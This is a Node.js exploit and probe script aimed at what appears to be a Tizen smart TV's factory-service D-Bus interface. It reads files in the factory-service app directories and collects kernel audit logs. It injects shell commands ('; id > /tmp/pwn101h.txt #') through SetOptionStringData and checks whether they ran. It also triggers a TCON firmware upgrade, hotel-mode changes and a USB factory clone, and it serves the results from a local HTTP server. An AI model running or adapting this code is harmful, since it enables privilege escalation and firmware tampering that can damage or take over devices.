'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8190;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe101h.txt';
var PWN = '/tmp/pwn101h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Pre-create pwn file
  'try { fs.writeFileSync("' + PWN + '", "pre\\n"); r.pwn_ok = true; } catch(e) {}',

  // 2. List /opt/usr/apps/factory-service/ and subdirs
  'try { r.factory_app_root = fs.readdirSync("/opt/usr/apps/factory-service"); } catch(e) { r.factory_app_root = "ERR:"+e.message.slice(0,50); }',
  'r.factory_app_subdirs = {};',
  'try {',
  '  var froot = fs.readdirSync("/opt/usr/apps/factory-service");',
  '  if (froot) froot.forEach(function(d) {',
  '    try {',
  '      var st = fs.statSync("/opt/usr/apps/factory-service/"+d);',
  '      if (st.isDirectory()) {',
  '        try { r.factory_app_subdirs[d] = fs.readdirSync("/opt/usr/apps/factory-service/"+d); } catch(e2) { r.factory_app_subdirs[d] = "ERR:"+e2.message.slice(0,50); }',
  '      } else {',
  '        r.factory_app_subdirs[d] = { size: st.size, type: "file" };',
  '      }',
  '    } catch(e3) { r.factory_app_subdirs[d] = "STAT_ERR:"+e3.message.slice(0,40); }',
  '  });',
  '} catch(e) {}',

  // 3. Read files in /opt/usr/apps/factory-service/share/
  'r.factory_share_reads = {};',
  'try {',
  '  var fshare = fs.readdirSync("/opt/usr/apps/factory-service/share");',
  '  if (fshare) fshare.slice(0,20).forEach(function(f) {',
  '    try {',
  '      var st2 = fs.statSync("/opt/usr/apps/factory-service/share/"+f);',
  '      if (st2.isDirectory()) {',
  '        try { r.factory_share_reads[f] = fs.readdirSync("/opt/usr/apps/factory-service/share/"+f).slice(0,20); } catch(e2) { r.factory_share_reads[f] = "DIR:"+e2.message.slice(0,40); }',
  '      } else {',
  '        try {',
  '          if (f.match(/\\.(xml|json|txt|conf|db|log|ini|dat)$/)) {',
  '            r.factory_share_reads[f] = fs.readFileSync("/opt/usr/apps/factory-service/share/"+f,"utf8").slice(0,1000);',
  '          } else {',
  '            r.factory_share_reads[f] = { size: st2.size, type: "binary" };',
  '          }',
  '        } catch(e3) { r.factory_share_reads[f] = "READ_ERR:"+e3.message.slice(0,40); }',
  '      }',
  '    } catch(e4) { r.factory_share_reads[f] = "STAT_ERR:"+e4.message.slice(0,40); }',
  '  });',
  '} catch(e) {}',

  // 4. Full SMACK audit log from dmesg
  'try {',
  '  var o_dm = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  var dm_lines = (o_dm.stdout||new Buffer(0)).toString().split("\\n");',
  '  var smack_lines = dm_lines.filter(function(l){ return l.indexOf("SMACK")>-1||l.indexOf("smack")>-1||l.indexOf("audit")>-1||l.indexOf("denied")>-1; });',
  '  r.smack_audit_full = smack_lines.join("\\n").slice(0,3000);',
  '  r.dmesg_last50 = dm_lines.slice(-50).join("\\n").slice(0,3000);',
  '} catch(e) {}',

  // 5. SetOptionStringData(7) tests — empty slot injection
  'r.k7_injection = {};',
  // Test 1: short alpha
  'try {',
  '  var o_k7a = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","7","AAAA","4"],{timeout:4000});',
  '  r.k7_injection.alpha4 = (o_k7a.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  // Test 2: with slash
  'try {',
  '  var o_k7b = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","7","A/B","3"],{timeout:4000});',
  '  r.k7_injection.slash = (o_k7b.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  // Test 3: shell metachar injection
  'try {',
  '  var inj = "; id > ' + PWN + ' #";',
  '  var o_k7c = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","7",inj,String(inj.length)],{timeout:4000});',
  '  r.k7_injection.shell_inj = (o_k7c.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  // Read back k7
  'try {',
  '  var o_k7r = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetOptionStringData","7"],{timeout:3000});',
  '  r.k7_readback = (o_k7r.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) {}',

  // 6. If k7 accepts values, try k8-k10 too
  'r.k8_to_k10_inject = {};',
  'for (var ki = 8; ki <= 10; ki++) {',
  '  try {',
  '    var inj2 = "; id > ' + PWN + ' #";',
  '    var o_ki = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData",String(ki),inj2,String(inj2.length)],{timeout:4000});',
  '    r.k8_to_k10_inject["k"+ki] = (o_ki.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '  } catch(e) {}',
  '}',

  // 7. After injection attempts, trigger firmware-related operations and watch dmesg
  'var dm_base = 0;',
  'try { dm_base = cp.spawnSync("dmesg",[],{timeout:3000}).stdout.toString().split("\\n").length; } catch(e) {}',
  // Trigger TCON upgrade mode 1 (uses TCON_FW_KantM2.bin, not model string) — does k7 appear?
  'try {',
  '  var o_tsp1 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetParameter","10804","1"],{timeout:3000});',
  '  r.tcon_mode1_set = (o_tsp1.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  'try {',
  '  var o_te1 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","10804","0"],{timeout:12000});',
  '  r.tcon_mode1_exec = (o_te1.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  'try {',
  '  var dm_tcon1 = cp.spawnSync("dmesg",[],{timeout:3000}).stdout.toString().split("\\n");',
  '  r.tcon_mode1_dmesg = dm_tcon1.slice(dm_base).join("\\n").slice(0,500);',
  '  dm_base = dm_tcon1.length;',
  '} catch(e) {}',

  // 8. SetHotelModeInfo gdbus syntax fix — use array literal syntax
  'try {',
  '  var o_shm2 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetHotelModeInfo","@au","[3,0,0,0,0,100,10,0,0,0,65536,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]"],{timeout:5000});',
  '  r.set_hotel_mode_v2 = (o_shm2.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) { r.set_hotel_mode_v2_err = e.message.slice(0,60); }',

  // 9. /opt/usr/apps/ — list all factory service related apps
  'try { r.opt_usr_apps = fs.readdirSync("/opt/usr/apps").slice(0,30); } catch(e) { r.opt_usr_apps = "ERR:"+e.message.slice(0,50); }',

  // 10. FactoryCloneUsbToTv — try USB-to-TV direction + dmesg
  'try {',
  '  var o_utv = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.FactoryCloneUsbToTv"],{timeout:12000});',
  '  r.clone_usb_to_tv = (o_utv.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) {}',
  'try {',
  '  var dm_utv = cp.spawnSync("dmesg",[],{timeout:3000}).stdout.toString().split("\\n");',
  '  r.clone_usb_tv_dmesg = dm_utv.slice(dm_base).join("\\n").slice(0,1000);',
  '  dm_base = dm_utv.length;',
  '} catch(e) {}',

  // 11. GetItemString sweep 20..100 — looking for config paths
  'r.item_strings_20_100 = {};',
  'for (var isk = 20; isk <= 100; isk += 10) {',
  '  try {',
  '    var o_isk = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetItemString",String(isk)],{timeout:3000});',
  '    var iskout = (o_isk.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '    if (iskout && iskout.indexOf("(1,)") === -1) r.item_strings_20_100["k"+isk] = iskout;',
  '  } catch(e) {}',
  '}',

  // 12. pwn check + new files
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) {}',
  'try {',
  '  var tmp_now = fs.readdirSync("/tmp");',
  '  r.tmp_check = tmp_now.filter(function(f){',
  '    return f.indexOf("pwn")>-1||f.indexOf("factory")>-1||f.indexOf("qr")>-1;',
  '  });',
  '} catch(e) {}',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 180000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
